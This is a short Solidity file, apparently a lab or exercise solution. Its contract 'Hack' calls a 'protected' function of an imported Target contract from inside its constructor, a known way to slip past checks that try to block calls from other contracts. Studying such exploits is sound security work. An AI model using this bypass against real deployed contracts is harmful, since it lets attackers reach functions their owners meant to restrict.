// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Target.sol";

contract Hack {
    constructor(address target) {
        Target(target).protected();
    }
}
